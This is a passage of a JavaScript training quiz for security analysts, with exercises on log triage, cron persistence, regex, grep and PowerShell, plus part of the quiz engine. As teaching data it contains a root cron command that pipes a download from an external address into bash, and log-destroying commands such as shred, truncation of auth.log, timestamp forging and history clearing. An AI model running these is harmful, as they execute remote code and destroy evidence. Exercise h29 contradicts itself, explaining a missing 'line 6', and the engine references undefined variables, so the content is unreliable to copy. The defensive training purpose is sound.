hint:'Select-String takes the search text with -Pattern. The parameter that prints neighbouring lines is -Context and takes before,after counts.',
text:'Select-String {{0}} "4625" {{1}} 2,2 -Path C:\\Logs\\security.log\nshows each failed logon with two lines of context before and after',
slots:['-Pattern','-Context'],
bank:['-Pattern','-Context','-Match','-List','-SimpleMatch','-Raw'],
expl:'Select-String needs -Pattern to name what to search for; -Context 2,2 prints two lines before and two after every hit \u2014 perfect for seeing what the account did around a failed logon. -Match belongs to Where-Object conditions, -List stops at the first match per file, -SimpleMatch disables regex, and -Raw belongs to Get-Content. Two parameters, and the difference between a bare hit and a readable story.'},
{id:'h19',type:'logview',theme:'Analysis Methods',title:'Memory leak or masquerade?',
scenario:'Your baseline for db02 says: nginx sits near 200 MB resident, postgres near 1.1 GB (about 11% of memory), kernel kworker threads near 0 MB, and no user process above 10% memory or 10% CPU. A monitoring alert fired at 14:20 and you open the snapshot.',
log:{file:'top snapshot \u2014 db02 (14:20)',lines:[
 {t:'  PID USER      VIRT   RES    %CPU %MEM COMMAND',k:'mut'},
 {t:'  912 root      220M    54M    0.3  0.9 sshd'},
 {t:' 1180 www-data  1.1G   205M    1.2  4.1 nginx: worker'},
 {t:' 1400 postgres  3.2G   1.1G    2.0 11.0 postgres: checkpointer',k:'mut'},
 {t:' 7741 miner    6.9G   6.4G   96.1 61.2 /tmp/kworker-mount',k:'bad'},
 {t:' 7801 root       0M     0M    0.1  0.0 [kworker/0:1]',k:'mut'},
 {t:' 1104 alopez   210M    18M    0.4  0.4 bash',k:'mut'}]},
question:'Use the baseline. Which line is the true anomaly, and why?',
hint:'Compare every row with its baseline entry \u2014 then ask where the process lives and what name it borrows.',
choices:[
 {t:'/tmp/kworker-mount \u2014 6.4 GB resident and 96% CPU, a user-space process imitating a kernel worker name.',ok:true,fb:''},
 {t:'[kworker/0:1] \u2014 real kernel workers must never appear inside the top list at all.',ok:false,fb:'Kernel kworker threads are normal in top; this one sits at 0 MB and 0.1% CPU, exactly as the baseline expects.'},
 {t:'postgres checkpointer at 11% MEM \u2014 above the 10% rule that user processes must respect.',ok:false,fb:'The baseline documents postgres specifically at about 1.1 GB / 11%; the 10% rule applies to other user processes.'},
 {t:'nginx worker at 205 MB resident \u2014 slightly above the 200 MB baseline document.',ok:false,fb:'A 5 MB deviation from a documented approximate value is noise, not an anomaly.'}],
expl:'Masquerading is the tell: a real kernel worker lives in kernel space, shows no /tmp path and uses no user memory. This process sits in /tmp, eats 6.4 GB resident and 96% CPU \u2014 a mining or cryptolocker-class implant borrowing a trustworthy name. The other rows all fit their baseline entries, which is exactly why keeping a written baseline pays: "normal" is a document, not a feeling. A quick diff of the unit file or cron entry that spawns it against yesterday\u2019s copy would show when the change landed.'},
{id:'h20',type:'qcm',theme:'Bash & Linux Analysis',title:'Two cron findings, one verdict',
scenario:'Two findings land in the queue at the same minute. Host A: /etc/cron.d/.sys-sync, owned by root, runs curl -s hxxp://203[.]0[.]113[.]31/p | bash every 15 minutes; the file is hidden and no ticket matches. Host B: user mlee\u2019s crontab runs /home/mlee/bin/backup-photos.sh every Sunday; the script\u2019s hash matches the known backup script and mlee confirms it.',
question:'Which finding is more severe, and why?',
hint:'Severity follows what runs and with whose privileges \u2014 verified personal backup versus unverified remote code as root.',
choices:[
 {t:'Host A \u2014 root-owned persistence piping an external script into bash runs attacker code every 15 minutes.',ok:true,fb:''},
 {t:'Host B \u2014 user crontabs are always more dangerous than hidden files in /etc/cron.d.',ok:false,fb:'Location alone does not set severity: what the job executes does. A verified personal backup is routine.'},
 {t:'Both critical \u2014 any cron job that runs outside business hours is by itself an incident.',ok:false,fb:'Schedule time is not the risk. Unverified code execution as root is.'},
 {t:'Neither one \u2014 cron jobs are just configuration, not security events at all.',ok:false,fb:'A root cron that downloads and runs remote code is one of the most common persistence mechanisms there is.'}],
expl:'Severity follows what can execute and with whose privileges. Host A runs an unverified remote payload as root on a timer \u2014 textbook persistence, treat as an active intrusion. Host B is verified, hashed, user-owned and explained. The lesson: judge cron findings by the command and the account behind them, never by the folder they sit in.'},
{id:'h21',type:'dragdrop',theme:'Analysis Methods',title:'Evidence-safe or evidence-destroying?',
scenario:'You are reviewing your own runbook before the next live response. Every command below has appeared in some runbook somewhere. Sort them by what they do to a compromised host.',
question:'Drag each command into the correct bin.',
hint:'Reading, searching and hashing observe. shred, truncation with > and timestamp forging all rewrite data that belongs to the record.',
items:[
 {t:'grep -c Failed /var/log/auth.log',bin:0,fb:'Counts matching lines \u2014 read-only.'},
 {t:'find /tmp -mtime -1 -ls',bin:0,fb:'Lists recently changed files \u2014 read-only.'},
 {t:'md5sum /usr/bin/whoami',bin:0,fb:'Hashes a system binary \u2014 read-only, and a tamper check.'},
 {t:'shred /var/log/auth.log',bin:1,fb:'Overwrites the log with garbage and deletes it \u2014 total destruction of the record.'},
 {t:'> /var/log/auth.log',bin:1,fb:'Truncates the log to zero bytes by redirecting standard output onto it \u2014 the record is gone in one character.'},
 {t:'touch -r /bin/ls /tmp/.b.tgz',bin:1,fb:'Forges the archive\u2019s timestamps from a reference file \u2014 history rewriting that hides when it appeared.'}],
bins:['Safe to run during live triage','Destroys or rewrites evidence'],
expl:'Live triage runs on one rule: observe, never modify. grep, find and md5sum leave the data untouched. shred overwrites and removes, a bare > truncates a log to nothing, and touch -r forges timestamps to hide when a file really appeared \u2014 all three turn a defensible record into an altered one. Note the third bin does not exist: even "cleaning up for the report" belongs on copies, never on the host.'}
,
{id:'h22',type:'fill',theme:'Regular Expressions',title:'Greedy meets lazy',
scenario:'Your note parses HTML-ish evidence: "<a><b>". A colleague\u2019s pattern <.+> returns one giant match and the note needs the two separate tags.',
question:'Complete the two missing pieces.',
hint:'Adding ? after a quantifier makes it lazy. The default behaviour of * and + has a name too.',
text:'To match the shortest text between brackets, add {{0}} after the quantifier \u2014 the pattern becomes "<.+" immediately followed by that same sign.\nIt finds two matches in "<a><b>", while the {{1}} default "<.+>" swallows everything in one match',
slots:['?','greedy'],
bank:['?','greedy','lazy','+','*','!'],
expl:'Quantifiers are greedy by default: <.+> grabs as much as possible, so it swallows "<a><b>" whole in one match. Add a question mark and the quantifier turns lazy \u2014 <.+?> stops at the first opportunity and yields <a> then <b>. Remember the direction: lazy is the exception you add (?), greedy is the built-in default you fight with anchors and tighter classes.'},
{id:'h23',type:'terminal',theme:'Bash & Linux Analysis',title:'The top-talker, from memory',
scenario:'The IR lead wants the connection summary for the report: from /home/analyst/conn.log (columns: time, address, port, protocol), print the address column, count the unique values, and show the most frequent addresses first. Choose your own tools \u2014 nothing is named for you.',
question:'Build the pipeline that counts unique addresses in column 2 of /home/analyst/conn.log, most frequent first.',
hint:'Extract with awk \u2019{print $2}\u2019 (or cut), then sort | uniq -c, then sort -rn, then head if you want the top few.',
note:'Sandbox shell. Pick the tools and flags; the answer is a one-line pipeline.',
prompt:'analyst@app02:~$',
accept:[
 {re:"^\\s*(sudo\\s+)?awk\\s*['\\\"]\\{\\s*print\\s+(\\\\)?\\$2\\s*\\}['\\\"]\\s+(?:\\/home\\/analyst\\/)?conn\\.log\\s*\\|\\s*sort\\s*\\|\\s*uniq\\s+-c\\s*\\|\\s*sort\\s+-[rn]{2}(\\s*\\|\\s*head(\\s+(-n\\s*\\d+|-\\d+))?)?\\s*$",out:['  47 203[.]0[.]113[.]7','  12 10[.]0[.]4[.]15','   3 198[.]51[.]100[.]23']},
 {re:"^\\s*cut\\s+-d\\s*['\\\"]\\s['\\\"]\\s+-f2\\s+(?:\\/home\\/analyst\\/)?conn\\.log\\s*\\|\\s*sort\\s*\\|\\s*uniq\\s+-c\\s*\\|\\s*sort\\s+-[rn]{2}(\\s*\\|\\s*head(\\s+(-n\\s*\\d+|-\\d+))?)?\\s*$",out:['  47 203[.]0[.]113[.]7','  12 10[.]0[.]4[.]15','   3 198[.]51[.]100[.]23']}],
canon:"awk '{print $2}' /home/analyst/conn.log | sort | uniq -c | sort -rn | head -3",
tip:'Extract the field (awk with $2, or cut with -f2), then sort | uniq -c to count, then sort -rn to put the biggest counts first. uniq only folds neighbours, so the first sort is not optional.',
expl:'The classic aggregation chain: extract the field, sort it so duplicates touch, count them with uniq -c, order by count with sort -rn, and limit with head. Each stage exists for a reason \u2014 forget the first sort and uniq reports far too many lines; forget -r and the quietest address tops the list. This data-reduction pipeline is the backbone of most quick log reports you will ever write, and when the next stage is a command instead of a count, xargs hands each line over as an argument.'},
{id:'h24',type:'order',theme:'Regular Expressions',title:'How a detection pattern gets built',
scenario:'A new analyst asks how you build a reliable regex for a detection rule without shipping something that fires on everything. You sketch the five stages you actually follow.',
question:'Put the five stages in order.',
hint:'Start from one real sample, pin the edges, tighten the middle, keep what you need, and only then trust it.',
items:['Write a rough pattern against one real sample line','Anchor it with ^ and $ so it cannot match mid-line','Replace loose dots with tight classes like [0-9.]','Wrap the part you will reuse in a capture group','Test against matching and non-matching lines before deploying'],
expl:'The workflow mirrors how professionals write patterns: rough draft from a real sample, anchors so the match cannot drift into unrelated text, tight character classes so dots and wildcards stop overreaching, a capture group only once the shape is stable, and finally a test bench of both positive and negative lines \u2014 because a rule you have not tested against "must not match" lines is a rule you have not tested.'},
{id:'h25',type:'scenario',theme:'Analysis Methods',title:'Eight gigabytes, one slice',
scenario:'auth.log on the archive host is 8 GB. You need exactly lines 100 to 150 for the timeline. A colleague suggests: cat auth.log | more, then scroll.',
question:'Answer both parts.',
hint:'Band-limiting tools read only what they must. Then think about what scrolling an 8 GB file actually costs you.',
parts:[
 {label:'Part 1 \u2014 which command gets exactly lines 100\u2013150?',choices:[
  {t:"sed -n '100,150p' auth.log",ok:true,fb:''},
  {t:'cat auth.log | more',ok:false,fb:'It streams all 8 GB and puts you on honour to stop at the right scroll \u2014 slow, error-prone, and useless in a report.'},
  {t:'tail -n 150 auth.log | less',ok:false,fb:'That gives the last 150 lines of the file (piping to less changes nothing), not lines 100\u2013150.'},
  {t:'head -n 150 auth.log | less',ok:false,fb:'That gives the first 150 lines (piping to less changes nothing) \u2014 close, but 100\u2013150 includes lines you would cut anyway.'}]},
 {label:'Part 2 \u2014 why band-limit instead of opening the whole file?',choices:[
  {t:'Band-limiters read only the requested slice \u2014 fast, and exactly what the report needs.',ok:true,fb:''},
  {t:'The full 8 GB file would not even fit on the disk of the host.',ok:false,fb:'The file is already on disk; the issue is reading it, not storing it.'},
  {t:'Logs are stored encrypted and only band-limiters can decrypt their slices.',ok:false,fb:'Band-limiting has nothing to do with encryption \u2014 it is about reading less.'},
  {t:'Opening a log file with cat writes new lines into it as you read.',ok:false,fb:'Reading does not write. The cost of cat is time and noise, not modification.'}]}],
expl:"sed -n '100,150p' prints exactly the requested line range and nothing else \u2014 the -n suppresses the default print-everything behaviour. head and tail bound the file from one end only; more streams everything and asks you to be the band-limiter by hand. The analysis-method lesson: on large evidence, never read more than the question needs \u2014 it is faster, and the output drops straight into the report."},
{id:'h26',type:'fill',theme:'Bash & Linux Analysis',title:'Three flags, one search',
scenario:'Your detection note needs a repeatable search: every nginx config file, listen directives only, ignoring case, comments dropped, and a quick count for the report.',
question:'Complete the three missing flags.',
hint:'One flag walks folders, one inverts the match to drop comments, one prints counts instead of lines.',
text:"grep {{0}} -i 'listen' /etc/nginx/  walks every file under the folder\ngrep -i 'listen' nginx.conf | grep {{1}} '^#'  keeps only the real directives\ngrep -i {{2}} 'listen' nginx.conf  prints only the number of matching lines",
slots:['-r','-v','-c'],
bank:['-r','-v','-c','-n','-l','-A'],
expl:'-r recurses into every file under the folder \u2014 no more one-file-at-a-time greps. -v inverts the match, so piping into grep -v "^#" drops every comment line and keeps directives. -c prints only the count of matching lines \u2014 the number your report wants. -n and -A add line numbers and trailing context (useful, but not what this note asks), and -l only lists file names.'},
{id:'h27',type:'logview',theme:'Analysis Methods',title:'mlee was asleep \u2014 the evidence disagrees',
scenario:'mlee filed a "not me" report: asleep at 02:00. You assemble the bundle from app02 before anyone interviews them again.',
log:{file:'evidence bundle \u2014 app02 (Mar 14\u201315)',lines:[
 {t:'last -F: mlee  pts/1  10[.]0[.]4[.]77   Sat Mar 14 19:40 \u2014 20:05  (00:25)  normal evening session',k:'good'},
 {t:'auth.log Mar 14 19:40:12: Accepted password for mlee from 10[.]0[.]4[.]77 port 44010',k:'good'},
 {t:'last -F: mlee  pts/2  203[.]0[.]113[.]150  Sun Mar 15 02:03:11 \u2014 02:21:40  (00:18)',k:'bad'},
 {t:'auth.log Mar 15 02:03:05: Failed password for mlee from 203[.]0[.]113[.]150 port 55008',k:'bad'},
 {t:'auth.log Mar 15 02:03:09: Accepted password for mlee from 203[.]0[.]113[.]150 port 55012',k:'bad'},
 {t:'auth.log Mar 15 02:22:01: sudo: mlee : TTY=pts/2 ; COMMAND=/usr/bin/tar czf /tmp/.b.tgz /home/mlee',k:'bad'},
 {t:'history mlee 02:21:55: history -c && exit',k:'bad'},
 {t:'logrotate.log Mar 15 02:30: auth.log rotated (schedule: Sunday 04:00)',k:'bad'}]},
question:'Use the filter if you need it. What does the bundle establish, and what follows?',
hint:'Three sources agree: wtmp, auth.log and the history/rotation lines. Read them as one timeline from 02:03 to 02:30.',
choices:[
 {t:'Compromised \u2014 used at 02:03 from an unknown external address, data archived, traces cleared; freeze and preserve.',ok:true,fb:''},
 {t:'Innocent \u2014 the 02:03 session was mlee working late; the external address is their VPN exit node.',ok:false,fb:'No record ties 203[.]0[.]113[.]150 to mlee; the session cleared its own history and rotated logs early. Innocent sessions do not do that.'},
 {t:'Inconclusive \u2014 the failed and successful logons cancel each other out, so nothing is proven.',ok:false,fb:'The failure at 02:03:05 is the guess; the success four seconds later is the entry. Together they are the strongest possible pair.'},
 {t:'Not breached \u2014 the single failed attempt at 02:03:05 proves the attacker never got in.',ok:false,fb:'One wrong password, then the right one. The archive, sudo and history-cleanup lines confirm active use.'}],
expl:'Three independent artefacts correlate into one story: wtmp shows a session from an address mlee never used, auth.log shows that session archiving the home directory with sudo, and the history clear plus the off-schedule log rotation show deliberate trace removal. One source can lie; three agreeing sources do not. Freeze the account, preserve the bundle, and interview with the timeline on the table.'},
{id:'h28',type:'match',theme:'PowerShell',title:'Constructs in the wild',
scenario:'Script block logging from WKS-204 contains five PowerShell constructs. Before the report, tie each to what it actually does.',
question:'Match each construct with its meaning.',
hint:'$env: reads an environment value. $_ is the pipeline\u2019s current item. -ErrorAction controls error noise. % is a short alias. Start-Transcript records a session.',
items:[
 {t:'$env:TEMP',bin:0,fb:'Reads the TEMP environment variable \u2014 the current user\u2019s temp folder path.'},
 {t:'$_',bin:1,fb:'The current object coming down the pipeline inside Where-Object or ForEach-Object.'},
 {t:'-ErrorAction SilentlyContinue',bin:2,fb:'Tells a cmdlet to keep going on errors and hide the error text \u2014 attackers love the silence.'},
 {t:'%',bin:3,fb:'A built-in alias for ForEach-Object \u2014 short, common, and obfuscation-friendly.'},
 {t:'Start-Transcript',bin:4,fb:'Starts recording the whole PowerShell session \u2014 input and output \u2014 to a file.'}],
bins:['Reads a user environment value','The current pipeline object','Suppresses errors and keeps running','Alias for ForEach-Object','Records the whole session to a file'],
expl:'$env:TEMP is where staging files love to hide; $_ is the pipeline item every filter block uses; -ErrorAction SilentlyContinue hides failures \u2014 in attacker scripts it silences their own mistakes; % is the ForEach-Object cmdlet compressed by an alias to one character, which is why deobfuscation starts by expanding aliases; Start-Transcript is the double-edged one \u2014 defenders enable it for visibility, attackers avoid it or stop it. Underneath, PowerShell cmdlets keep Verb-Noun naming, objects keep flowing down the object pipeline (Get-Member lists what each one can do), extra cmdlets arrive with Import-Module, and the classic editor for scripts like these was PowerShell ISE.'},
{id:'h29',type:'spot',theme:'Shell Scripting Basics',title:'The wrapper that lies to itself',
scenario:'A monitoring wrapper checks whether the log has failed-password entries and reacts. It has been reporting "grep worked" every night for a week \u2014 even during the outage when the log was unreadable. Two lines are at fault.',
question:'Click every line that contains a real mistake.',
hint:'One line writes into the very file it reads. One line tests the wrong command\u2019s exit code \u2014 pipelines return the status of the last command.',
lines:[
 {t:'#!/bin/bash'},
 {t:'cp /var/log/auth.log /tmp/ir/auth_copy.log'},
 {t:'grep -c "Failed password" /var/log/auth.log > /var/log/auth.log',bad:true,why:'The redirect opens and truncates auth.log before grep reads it \u2014 the live log is replaced by its own count. Read from the copy.'},

 {t:'echo "done"'}],
tip:'Two shell facts explain both bugs: a redirect creates/truncates its file before the command runs, and a pipeline\u2019s exit status (exit code) is the last command\u2019s.',
expl:'Line 3 is self-destruction: bash sets up > /var/log/auth.log (emptying it) before grep even starts, so the live log becomes one number. Line 6 trusts $? after a pipeline \u2014 but $? holds the exit code of wc -l, which succeeds even when grep found nothing, which is why the check printed "grep worked" through the outage. The fix is to store the value in a variable (count=$(grep -c \u2026)) and let the if/then/else branch on real numbers instead of a borrowed status.'},

/* ================= engine ================= */
var META = {};
(function(){
  var m = document.getElementById('cm-exercise-meta');
  try { META = JSON.parse(m.textContent); } catch(e) { /* keep empty */ }
})();
var TIMER_TOTAL = 2597;
var passMark = META.passMark, NQ = EXERCISES.length;
function $(s,r){return (r||document).querySelector(s);}
function $all(s,r){return Array.prototype.slice.call((r||document).querySelectorAll(s));}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function shuf(a){a=a.slice();for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1)),t=a[i];a[i]=a[j];a[j]=t;}return a;}
function fmt(sec){var m=Math.floor(sec/60),s=sec%60;return (m<10?'0':'')+m+':'+(s<10?'0':'')+s;}
function r1(x){return Math.round(x*10)/10;}
var ICON={ok:'\u2713',bad:'\u2717',warn:'\u26a0'};
var WORD={ok:'correct',bad:'wrong',warn:'missed'};
function mk(kind){return ' <span class="mk mk-'+kind+'">'+ICON[kind]+' '+WORD[kind]+'</span>';}
var SEV = (META.difficulty==='hard')?'HARD':'MEDIUM';
var SEVCLS = (SEV==='HARD')?'sev-hard':'sev-medium';
var S = {phase:'intro',order:[],idx:0,ans:{},remaining:TIMER_TOTAL,tid:null,pauseM:false,pauseC:false,reported:false,user:''};
function ansOf(i){var id=S.order[i];if(!S.ans[id]){S.ans[id]={};}return S.ans[id];}
function curEx(){return EXERCISES[S.order[S.idx]];}
var stageApi=null;
/* ---------- timer & pause ---------- */
function startTimer(){if(S.tid){clearInterval(S.tid);}S.tid=setInterval(tick,1000);}
function tick(){
  if(S.phase!=='run')return;
  if(S.pauseM||S.pauseC){return;}
  S.remaining--;
  if(S.remaining<=0){S.remaining=0;renderTimer();finish(true);return;}
  renderTimer();
}
function renderTimer(){
  var t=$('#timer');t.textContent=fmt(S.remaining);
  $('#timerbox').classList.toggle('low',S.remaining<=300);
}
function renderPauseState(){
  var el=$('#pausestate'),parts=[];
  if(S.pauseM)parts.push('\u23f8 Paused (manual)');
  if(S.pauseC)parts.push('\u23f1 Timer paused \u2014 review mode');
  if(parts.length&&S.phase==='run'){el.hidden=false;el.textContent=parts.join('  \u00b7  ');el.className='pausestate '+(S.pauseM&&S.pauseC?'both':(S.pauseM?'manual':'check'));}
  else{el.hidden=true;}
  var bl=S.pauseM&&S.phase==='run';
  $('#stage').classList.toggle('blurred',bl);
  $('#pauseoverlay').classList.toggle('show',bl);
  $('#btn-pause').setAttribute('aria-pressed',S.pauseM?'true':'false');
  $('#btn-pause').textContent=S.pauseM?'Resume':'Pause';
}
/* ---------- header rendering ---------- */
function renderScore(){
  var e=0;for(var k in S.ans){if(S.ans[k].committed){e+=S.ans[k].committed.earned;}}
  $('#score').textContent=String(r1(e));
}
function doneCount(){var c=0;for(var k in S.ans){if(S.ans[k].committed||S.ans[k].status==='skipped')c++;}return c;}
function renderProgress(){
  var c=doneCount();
  $('#progressbar').style.width=(NQ?Math.round(c/NQ*100):0)+'%';
  $('#progresstext').textContent=c+' of '+NQ+' exercises handled \u00b7 pass mark '+passMark+'%';
}
function navState(pos){
  var a=S.ans[S.order[pos]];
  if(pos===S.idx)return 'cur';
  if(!a||(!a.committed&&a.status!=='skipped'))return '';
  if(a.status==='skipped')return 'skipped';
  if(a.label==='full')return 'done-ok';
  if(a.label==='partial')return 'done-part';
  return 'done-zero';
}
function navWord(pos){
  var st=navState(pos);
  if(st==='skipped')return ' (skipped)';
  if(st==='done-ok')return ' (answered, full credit)';
  if(st==='done-part')return ' (answered, partial credit)';
  if(st==='done-zero')return ' (answered, zero)';
  if(st==='cur')return ' (current)';
  return ' (not answered yet)';
}
function navTitle(pos){
  var st=navState(pos);
  if(st==='skipped')return 'Skipped';
  if(st==='done-ok')return 'Full credit';
  if(st==='done-part')return 'Partial credit';
  if(st==='done-zero')return 'Zero';
  if(st==='cur')return 'Current';
  return 'Not answered';
}
function renderNav(){
  var nav=$('#navigator');nav.innerHTML='';
  for(var p=0;p<NQ;p++){
    var b=document.createElement('button');
    b.type='button';b.className='nav-chip '+navState(p);
    b.textContent=String(p+1);
    b.setAttribute('aria-label','Go to exercise '+(p+1)+navWord(p));
    b.title=navTitle(p);
    (function(pos){b.addEventListener('click',function(){if(S.phase!=='run')return;S.pauseC=false;showEx(pos);});})(p);
    nav.appendChild(b);
  }
}
function renderThemeProgress(){
  var body=$('#themeprogbody');body.innerHTML='';
  var th={};
  for(var i=0;i<EXERCISES.length;i++){var ex=EXERCISES[i];th[ex.theme]=th[ex.theme]||{t:0,c:0};th[ex.theme].t++;
    var a=S.ans[i];if(a&&a.committed&&a.label==='full')th[ex.theme].c++;}
  for(var name in th){
    var d=document.createElement('div');d.className='tp-item';
    d.innerHTML=esc(name)+': <b>'+th[name].c+'/'+th[name].t+'</b> full';
    body.appendChild(d);
  }
}
/* ---------- small helpers ---------- */
var _pd=document.createElement('div');
function plain(html,max){_pd.innerHTML=html;var t=(_pd.textContent||'').replace(/\s+/g,' ').trim();if(max&&t.length>max)t=t.slice(0,max-1)+'\u2026';return t;}
function el(tag,cls,html){var d=document.createElement(tag);if(cls)d.className=cls;if(html!=null)d.innerHTML=html;return d;}
function ansLabel(t){return el('span','lbl lbl-ans',t);}
/* ---------- exercise shell ---------- */
function showEx(pos){
  S.idx=pos;stageApi=null;
  var ex=curEx();
  var st=$('#stage');st.innerHTML='';
  var card=el('div','card intro');card.setAttribute('data-testid','exercise');

  card.appendChild(head);
  var sc=el('div','blk scenario','<span class="lbl lbl-scen">Scenario</span><div>'+ex.scenario+'</div>');
  card.appendChild(sc);
  card.appendChild(el('div','blk qbox','<span class="lbl lbl-q">Question</span><div>'+ex.question+'</div>'));
  var ab=el('div','blk abox');
  var typeLbl={qcm:'Choose one',multi:'Select all that apply',scenario:'Choose one response per item',branch:'Choose one \u2014 your choice drives the next step',dragdrop:'Drag each item into a bin (or click item, then click bin)',match:'Match each item (drag, or click item then click its pair)',fill:'Fill each blank (click a word, then click a slot)',order:'Put the steps in order (drag, or use the arrows)',rank:'Rank the items (drag, or use the arrows)',spot:'Click every bad line',logview:'Use the filter, then choose one answer',terminal:'Type the command, then press Check'}[ex.type];
  ab.appendChild(ansLabel(typeLbl));
  var area=el('div');ab.appendChild(area);
  card.appendChild(ab);
  var hint=el('div','hintbox');hint.hidden=true;card.appendChild(hint);
  var expl=el('div','blk expl');expl.hidden=true;card.appendChild(expl);
  var bar=el('div','btnbar');
  var bCheck=el('button','btn primary','Check');bCheck.id='btn-check';bCheck.setAttribute('data-testid','check');
  var bSkip=el('button','btn','Skip');bSkip.id='btn-skip';bSkip.setAttribute('data-testid','skip');
  var bHint=el('button','btn ghost','Hint (\u221210%)');bHint.id='btn-hint';
  var bRev=el('button','btn warnb','Revise');bRev.id='btn-revise';bRev.hidden=true;
  var bNext=el('button','btn good',(pos===NQ-1)?'Finish':'Next');bNext.id='btn-next';bNext.setAttribute('data-testid','next');
  var flash=el('span','flash');flash.setAttribute('role','status');
  bar.appendChild(bCheck);bar.appendChild(bSkip);bar.appendChild(bHint);bar.appendChild(bRev);bar.appendChild(bNext);bar.appendChild(flash);
  card.appendChild(bar);
  st.appendChild(card);
  var api=RENDER[ex.type](area,ex,card);
  stageApi=api;
  bCheck.addEventListener('click',onCheck);
  bSkip.addEventListener('click',onSkip);
  bHint.addEventListener('click',function(){
    var a=ansOf(S.idx);
    if(a.hint)return;
    a.hint=true;hint.hidden=false;hint.textContent='\u26a0 Hint: '+ex.hint;bHint.disabled=true;
    flash.textContent='Hint used \u2014 this exercise will earn 10% less.';
  });
  bRev.addEventListener('click',function(){
    var a=ansOf(S.idx);
    api.restore(a.committed.live);
    api.clearMarks();
    expl.hidden=true;expl.innerHTML='';
    bCheck.disabled=false;bRev.hidden=true;
    $('#btn-hint').disabled=!!a.hint;
    a.committed=null;
    flash.textContent='Answer unlocked \u2014 press Check again to re-grade.';
  });
  bNext.addEventListener('click',goNext);
  if(ansOf(pos).hint){hint.hidden=false;hint.textContent='\u26a0 Hint: '+ex.hint;bHint.disabled=true;}
  renderNav();renderProgress();
  h.focus();
}
/* ---------- choice family ---------- */
function buildChoices(area,ex,multi,name){
  var wrap=el('div','choices');wrap.setAttribute('role',multi?'group':'radiogroup');
  var idxs=shuf(ex.choices.map(function(c,i){return i;}));
  var inputs=[];
  idxs.forEach(function(ci){
    var c=ex.choices[ci];
    var lab=el('label','choice');lab.setAttribute('data-ok',c.ok?'1':'0');
    var inp=document.createElement('input');
    inp.type=multi?'checkbox':'radio';inp.name=name;inp.value=String(ci);
    inp.addEventListener('change',function(){$all('input',wrap).forEach(function(o){o.closest('.choice').classList.toggle('sel',o.checked);});});
    lab.appendChild(inp);
    lab.appendChild(el('span',null,c.t));
    lab.appendChild(el('span','mkslot',''));
    wrap.appendChild(lab);inputs.push(inp);
  });
  area.appendChild(wrap);
  return {wrap:wrap,inputs:inputs,byVal:function(v){for(var i=0;i<inputs.length;i++){if(inputs[i].value===String(v))return inputs[i];}return null;}};
}
function gradeChoice(ex,ex2,inp,multi){
  var sel=[],okIdx=[];
  ex.choices.forEach(function(c,i){if(c.ok)okIdx.push(i);});
  inp.forEach(function(o){if(o.checked)sel.push(parseInt(o.value,10));});
  var okCount=okIdx.length;
  var hit=0;
  sel.forEach(function(ci){if(ex.choices[ci].ok)hit++;});
  var earned=multi?(okCount?hit/okCount:0):(sel.length===1&&ex.choices[sel[0]].ok?1:0);
  var tips=[];
  sel.forEach(function(ci){if(!ex.choices[ci].ok&&ex.choices[ci].fb)tips.push(plain(ex.choices[ci].fb,160));});
  return {earned:earned,sel:sel,okIdx:okIdx,tips:tips};
}
function markChoices(ex,wrap,inp,res,multi){
  inp.forEach(function(o){
    var ci=parseInt(o.value,10);var lab=o.closest('.choice');var slot=lab.querySelector('.mkslot');
    slot.innerHTML='';
    lab.classList.remove('m-ok','m-bad','m-warn');
    var isOk=ex.choices[ci].ok,isSelected=o.checked;
    if(isOk&&isSelected){lab.classList.add('m-ok');slot.innerHTML=mk('ok');}
    else if(isOk&&!isSelected&&multi){lab.classList.add('m-warn');slot.innerHTML=mk('warn');}
    else if(!isOk&&isSelected){lab.classList.add('m-bad');slot.innerHTML=mk('bad');}
    if(!multi&&isOk&&!isSelected){lab.classList.add('m-ok');slot.innerHTML=mk('ok');}
  });
}
function sumChoices(ex,sel){
  if(!sel.length)return '(nothing selected)';
  return sel.map(function(ci){return plain(ex.choices[ci].t,70);}).join(' | ');
}
function sumCorrect(ex){var a=[];ex.choices.forEach(function(c){if(c.ok)a.push(plain(c.t,70));});return a.join(' | ');}
/* ---------- per-type renderers ---------- */
var RENDER={};
RENDER.qcm=function(area,ex){
  var b=buildChoices(area,ex,false,'q'+S.idx);
  return {
    live:function(){var s=[];b.inputs.forEach(function(o){if(o.checked)s.push(parseInt(o.value,10));});return s.length?{q:s[0]}:null;},
    restore:function(s){b.inputs.forEach(function(o){o.checked=(s&&s.q===parseInt(o.value,10));o.closest('.choice').classList.toggle('sel',o.checked);});},
    grade:function(){
      var res=gradeChoice(ex,null,b.inputs,false);
      markChoices(ex,b.wrap,b.inputs,res,false);
      var sel=res.sel;
      return {earned:res.earned,
        answerSummary:sumChoices(ex,sel),
        correctSummary:sumCorrect(ex),
        tips:res.tips};
    },
    clearMarks:function(){b.inputs.forEach(function(o){var lab=o.closest('.choice');lab.classList.remove('m-ok','m-bad','m-warn');lab.querySelector('.mkslot').innerHTML='';});}
  };
};
RENDER.multi=function(area,ex){

  return {
    live:function(){var s=[];b.inputs.forEach(function(o){if(o.checked)s.push(parseInt(o.value,10));});return s.length?{q:s}:null;},
    restore:function(s){b.inputs.forEach(function(o){o.checked=!!(s&&s.q&&s.q.indexOf(parseInt(o.value,10))>=0);o.closest('.choice').classList.toggle('sel',o.checked);});},
    grade:function(){
      var res=gradeChoice(ex,null,b.inputs,true);
      markChoices(ex,b.wrap,b.inputs,res,true);
      return {earned:res.earned,
        answerSummary:sumChoices(ex,res.sel),
        correctSummary:sumCorrect(ex),
        tips:res.tips};
    },
    clearMarks:function(){b.inputs.forEach(function(o){var lab=o.closest('.choice');lab.classList.remove('m-ok','m-bad','m-warn');lab.querySelector('.mkslot').innerHTML='';});}
  };
};
RENDER.scenario=function(area,ex){
  var parts=ex.parts,apis=[];
  parts.forEach(function(p,pi){
    area.appendChild(el('p','ansnote','<b>Item '+(pi+1)+':</b> '+p.label));
    var b=buildChoices(area,{choices:p.choices},false,'p'+S.idx+'_'+pi);
    apis.push(b);
  });
  return {
    live:function(){var s=[];apis.forEach(function(b){var v=null;b.inputs.forEach(function(o){if(o.checked)v=parseInt(o.value,10);});s.push(v);});return s.some(function(v){return v!=null;})?{p:s}:null;},
    restore:function(s){apis.forEach(function(b,pi){var v=s&&s.p?s.p[pi]:null;b.inputs.forEach(function(o){o.checked=(v===parseInt(o.value,10));o.closest('.choice').classList.toggle('sel',o.checked);});});},
    grade:function(){
